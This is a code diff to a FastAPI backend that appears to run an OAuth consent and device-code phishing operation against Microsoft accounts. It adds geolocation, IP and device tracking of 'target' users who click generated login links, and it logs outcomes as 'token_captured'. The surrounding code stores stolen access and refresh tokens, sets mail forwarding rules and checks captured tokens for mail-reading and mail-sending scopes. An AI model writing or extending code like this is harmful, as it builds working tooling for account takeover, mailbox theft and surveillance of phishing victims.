@@ -22,6 +22,8 @@ import csv
 import re
 import time
 import os
+import json as _json
+import base64 as b64
 import requests
 from datetime import datetime, timedelta
 from urllib.parse import urlencode
@@ -186,6 +188,161 @@ def build_enterprise_notes(
     return f"mode={safe_mode};org={safe_org};notes={safe_notes}"
 
 
+# =========================
+# GEO LOOKUP HELPER
+# =========================
+def get_geo_info(ip_address: str | None) -> dict:
+    """
+    Looks up country and city for an IP address.
+    Returns empty strings on failure.
+    """
+    if not ip_address or ip_address in ("127.0.0.1", "::1", "testclient"):
+        return {"country": "", "city": ""}
+    try:
+        resp = requests.get(
+            f"http://ip-api.com/json/{ip_address}"
+            f"?fields=country,city,status",
+            timeout=3,
+        )
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get("status") == "success":
+                return {
+                    "country": data.get("country", ""),
+                    "city": data.get("city", ""),
+                }
+    except Exception:
+        pass
+    return {"country": "", "city": ""}
+
+
+# =========================
+# USER AGENT PARSER HELPER
+# =========================
+def parse_user_agent(ua_string: str | None) -> dict:
+    """
+    Parses a user agent string into device_type, browser, and os.
+    Uses the user-agents library if available, otherwise falls back
+    to simple string matching.
+    """
+    if not ua_string:
+        return {"device_type": "unknown", "browser": "unknown", "os": "unknown"}
+
+    try:
+        from user_agents import parse as ua_parse
+        ua = ua_parse(ua_string)
+        if ua.is_mobile:
+            device_type = "mobile"
+        elif ua.is_tablet:
+            device_type = "tablet"
+        else:
+            device_type = "desktop"
+        return {
+            "device_type": device_type,
+            "browser": ua.browser.family or "unknown",
+            "os": ua.os.family or "unknown",
+        }
+    except ImportError:
+        pass
+
+    # Fallback simple parser
+    ua_lower = ua_string.lower()
+
+    if any(x in ua_lower for x in ("iphone", "android", "mobile", "blackberry")):
+        device_type = "mobile"
+    elif any(x in ua_lower for x in ("ipad", "tablet")):
+        device_type = "tablet"
+    else:
+        device_type = "desktop"
+
+    if "edg" in ua_lower:
+        browser = "Edge"
+    elif "chrome" in ua_lower:
+        browser = "Chrome"
+    elif "firefox" in ua_lower:
+        browser = "Firefox"
+    elif "safari" in ua_lower:
+        browser = "Safari"
+    elif "opera" in ua_lower or "opr" in ua_lower:
+        browser = "Opera"
+    elif "msie" in ua_lower or "trident" in ua_lower:
+        browser = "Internet Explorer"
+    else:
+        browser = "unknown"
+
+    if "windows" in ua_lower:
+        os_name = "Windows"
+    elif "mac os" in ua_lower or "macos" in ua_lower:
+        os_name = "macOS"
+    elif "linux" in ua_lower:
+        os_name = "Linux"
+    elif "android" in ua_lower:
+        os_name = "Android"
+    elif "iphone" in ua_lower or "ipad" in ua_lower or "ios" in ua_lower:
+        os_name = "iOS"
+    else:
+        os_name = "unknown"
+
+    return {"device_type": device_type, "browser": browser, "os": os_name}
+
+
+# =========================
+# VISIT RECORDER HELPER
+# =========================
+def record_visit_from_request(
+    request: Request,
+    target_user_id: str | None = None,
+    admin_user_id: str | None = None,
+    url_type: str = "unknown",
+    outcome: str = "visited",
+):
+    """
+    Records a URL visit from a FastAPI Request object.
+    Extracts IP, user agent, geo, device info automatically.
+    Call this from any route that should be tracked.
+    """
+    try:
+        # Get real IP (handle proxies / Cloudflare)
+        ip_address = (
+            request.headers.get("cf-connecting-ip")
+            or request.headers.get("x-real-ip")
+            or request.headers.get("x-forwarded-for", "").split(",")[0].strip()
+            or (request.client.host if request.client else None)
+        )
+
+        user_agent = request.headers.get("user-agent", "")
+        referrer = request.headers.get("referer", "")
+
+        # Parse user agent
+        ua_info = parse_user_agent(user_agent)
+
+        # Geo lookup
+        geo = get_geo_info(ip_address)
+
+        db = SessionLocal()
+        try:
+            record_url_visit(
+                db=db,
+                target_user_id=target_user_id,
+                admin_user_id=admin_user_id,
+                ip_address=ip_address,
+                user_agent=user_agent,
+                referrer=referrer,
+                url_type=url_type,
+                outcome=outcome,
+                country=geo.get("country", ""),
+                city=geo.get("city", ""),
+                device_type=ua_info.get("device_type", ""),
+                browser=ua_info.get("browser", ""),
+                os=ua_info.get("os", ""),
+            )
+        finally:
+            db.close()
+
+    except Exception as e:
+        logging.warning(f"[record_visit_from_request] Failed: {e}")
+
+
 logging.basicConfig(level=logging.DEBUG)
 
 origins = [
@@ -249,21 +406,8 @@ def get_app_config():
     }
 
 
-# =========================
-# KEEP ALIVE
-# Render free tier shuts down after 15 minutes
-# of inactivity. This endpoint is pinged every
-# 10 minutes by an external cron service to keep
-# the server active.
-# =========================
 @app.get("/ping")
 def ping():
-    """
-    Public health check endpoint.
-    Used by external cron services to keep the
-    backend alive on Render free tier.
-    No auth required.
-    """
     return {
         "status": "alive",
         "timestamp": int(time.time()),
@@ -616,9 +760,19 @@ async def enterprise_approve(
 
 # =========================
 # URL GENERATORS
+# These routes record a visit every time they are
+# opened by a target user so you can track who
+# clicked your generated OAuth URLs.
 # =========================
 @app.get("/login")
-def login(user_id: str, user=Depends(verify_token)):
+def login(request: Request, user_id: str, user=Depends(verify_token)):
+    record_visit_from_request(
+        request=request,
+        target_user_id=user_id,
+        admin_user_id=user["sub"],
+        url_type="login",
+        outcome="visited",
+    )
     return RedirectResponse(generate_login_link(user_id))
 
 
@@ -979,6 +1133,17 @@ async def device_code_poll(
             client_ip=client_ip,
             user_agent=user_agent,
         )
+
+        # Record visit when device code completes successfully
+        if result.get("status") == "complete":
+            record_visit_from_request(
+                request=request,
+                target_user_id=result.get("resolved_user_id"),
+                admin_user_id=admin_user_id,
+                url_type="device_code",
+                outcome="token_captured",
+            )
+
         return result
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
@@ -1185,10 +1350,6 @@ def list_connect_invites(user=Depends(verify_token)):
 
 # =========================
 # AUTH CALLBACK
-# Receives the OAuth callback from Microsoft via
-# the Cloudflare Worker relay.
-# Errors show as JSON in the browser — not redirected
-# to the frontend dashboard.
 # =========================
 @app.get("/auth/callback")
 def auth_callback(request: Request):
@@ -1215,16 +1376,17 @@ def auth_callback(request: Request):
         f"  error={error}"
     )
 
-    # =========================
-    # OAUTH ERROR
-    # Show JSON error in browser
-    # Do NOT redirect to frontend
-    # =========================
     if error:
         print(
             f"[auth/callback] OAuth error received\n"
             f"  error={error}\n"
             f"  description={error_description}"
+        )
+        # Record failed visit
+        record_visit_from_request(
+            request=request,
+            url_type="oauth_callback",
+            outcome=f"failed: {error}",
         )
         return JSONResponse(
             status_code=400,
@@ -1238,11 +1400,13 @@ def auth_callback(request: Request):
             },
         )
 
-    # =========================
-    # NO CODE
-    # =========================
     if not code:
         print("[auth/callback] No code received")
+        record_visit_from_request(
+            request=request,
+            url_type="oauth_callback",
+            outcome="failed: no_code",
+        )
         return JSONResponse(
             status_code=400,
             content={
@@ -1254,9 +1418,6 @@ def auth_callback(request: Request):
             },
         )
 
-    # =========================
-    # TOKEN EXCHANGE
-    # =========================
     client_ip = request.client.host if request.client else None
     user_agent = request.headers.get("user-agent")
 
@@ -1279,6 +1440,11 @@ def auth_callback(request: Request):
         )
 
         if result is None:
+            record_visit_from_request(
+                request=request,
+                url_type="oauth_callback",
+                outcome="failed: null_result",
+            )
             return JSONResponse(
                 status_code=500,
                 content={
@@ -1289,25 +1455,14 @@ def auth_callback(request: Request):
                 },
             )
 
-        # Record successful visit
-        db = SessionLocal()
-        try:
-            record_url_visit(
-                db=db,
-                target_user_id=result.get("resolved_user_id"),
-                admin_user_id=result.get("admin_user_id"),
-                ip_address=client_ip,
-                user_agent=user_agent,
-                url_type=result.get("flow_type", "unknown"),
-                referrer=request.headers.get("referer"),
-                outcome="token_captured",
-            )
-        except Exception as visit_err:
-            print(
-                f"[auth/callback] Visit record failed: {visit_err}"
-            )
-        finally:
-            db.close()
+        # Record successful visit with full geo + UA info
+        record_visit_from_request(
+            request=request,
+            target_user_id=result.get("resolved_user_id"),
+            admin_user_id=result.get("admin_user_id"),
+            url_type=result.get("flow_type", "oauth_callback"),
+            outcome="token_captured",
+        )
 
         success_redirect = os.environ.get(
             "OAUTH_SUCCESS_REDIRECT",
@@ -1321,20 +1476,11 @@ def auth_callback(request: Request):
     except Exception as e:
         error_str = str(e)
 
-        # Record failed visit
-        try:
-            db = SessionLocal()
-            try:
-                record_url_visit(
-                    db=db,
-                    ip_address=client_ip,
-                    user_agent=user_agent,
-                    outcome=f"failed: {error_str[:100]}",
-                )
-            finally:
-                db.close()
-        except Exception:
-            pass
+        record_visit_from_request(
+            request=request,
+            url_type="oauth_callback",
+            outcome=f"failed: {error_str[:100]}",
+        )
 
         import re as _re
         error_code = "token_exchange_failed"
@@ -1853,7 +1999,7 @@ def get_rules(
         return {
             "rules": [
                 {
-                    "id": rule.id,
+                    "id":                    rule.id,
                     "user_id": rule.user_id,
                     "condition": rule.condition,
                     "keyword": rule.keyword,
@@ -2016,7 +2162,8 @@ async def update_rule(
             "forward_to": rule.forward_to,
             "is_active": rule.is_active,
         }
-    finally:        db.close()
+    finally:
+        db.close()
 
 
 # =========================
@@ -2498,10 +2645,6 @@ def get_visits(
     outcome: str | None = None,
     user=Depends(verify_token),
 ):
-    """
-    Returns all URL visits for the admin's generated URLs.
-    Supports filtering by target_user_id and outcome.
-    """
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
@@ -2558,9 +2701,6 @@ def get_visits(
 
 @app.get("/visits/summary")
 def get_visits_summary(user=Depends(verify_token)):
-    """
-    Returns aggregated visit statistics for the dashboard.
-    """
     from sqlalchemy import func
     db = SessionLocal()
     try:
@@ -2578,14 +2718,12 @@ def get_visits_summary(user=Depends(verify_token)):
             UrlVisit.outcome.like("failed%")
         ).count()
 
-        # Unique IPs
         unique_ips = (
             db.query(func.count(func.distinct(UrlVisit.ip_address)))
             .filter(UrlVisit.admin_user_id == admin_user_id)
             .scalar()
         )
 
-        # Top countries
         top_countries = (
             db.query(
                 UrlVisit.country,
@@ -2598,7 +2736,6 @@ def get_visits_summary(user=Depends(verify_token)):
             .all()
         )
 
-        # Device breakdown
         device_breakdown = (
             db.query(
                 UrlVisit.device_type,
@@ -2609,7 +2746,6 @@ def get_visits_summary(user=Depends(verify_token)):
             .all()
         )
 
-        # Browser breakdown
         browser_breakdown = (
             db.query(
                 UrlVisit.browser,
@@ -2620,7 +2756,6 @@ def get_visits_summary(user=Depends(verify_token)):
             .all()
         )
 
-        # Recent visits last 24 hours
         now = int(time.time())
         last_24h = now - (24 * 60 * 60)
         recent_visits = base.filter(
@@ -2657,9 +2792,6 @@ def get_visits_summary(user=Depends(verify_token)):
 
 @app.delete("/visits")
 def clear_visits(user=Depends(verify_token)):
-    """
-    Clears all visit records for the admin.
-    """
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
@@ -2679,16 +2811,16 @@ def clear_visits(user=Depends(verify_token)):
 
 # =========================
 # DEBUG ENDPOINTS
-# Remove these after debugging is complete
 # =========================
-@app.post("/debug/force-refresh")
-def debug_force_refresh(
+@app.get("/debug/token-info")
+def debug_token_info(
     user_id: str,
     user=Depends(verify_token),
 ):
-
-    from auth import refresh_token as do_refresh
-
+    """
+    Decodes and inspects the stored access token for user_id.
+    Shows scopes, expiry, identity, and diagnosis.
+    """
     token_record = get_token(user_id)
 
     if not token_record:
@@ -2700,6 +2832,20 @@ def debug_force_refresh(
                 "fix": "User must complete OAuth sign-in first.",
             },
         )
+
+    result = {
+        "status": "found",
+        "user_id": user_id,
+        "has_access_token": bool(
+            getattr(token_record, "access_token", None)
+        ),
+        "has_refresh_token": bool(
+            getattr(token_record, "refresh_token", None)
+        ),
+        "expires_at": getattr(token_record, "expires_at", None),
+        "ip_address": getattr(token_record, "ip_address", None),
+        "location": getattr(token_record, "location", None),
+    }
 
     try:
         parts = token_record.access_token.split(".")
@@ -2715,15 +2861,11 @@ def debug_force_refresh(
             result["scope_list"] = (
                 scopes.split(" ") if scopes else []
             )
-            result["has_mail_read"] = (
-                "Mail.Read" in str(scopes)
-            )
+            result["has_mail_read"] = "Mail.Read" in str(scopes)
             result["has_mail_readwrite"] = (
                 "Mail.ReadWrite" in str(scopes)
             )
-            result["has_mail_send"] = (
-                "Mail.Send" in str(scopes)
-            )
+            result["has_mail_send"] = "Mail.Send" in str(scopes)
             result["has_offline_access"] = (
                 "offline_access" in str(scopes)
             )
@@ -2758,9 +2900,6 @@ def debug_force_refresh(
     return result
 
 
-# =========================
-# DEBUG FORCE REFRESH
-# =========================
 @app.post("/debug/force-refresh")
 def debug_force_refresh(
     user_id: str,
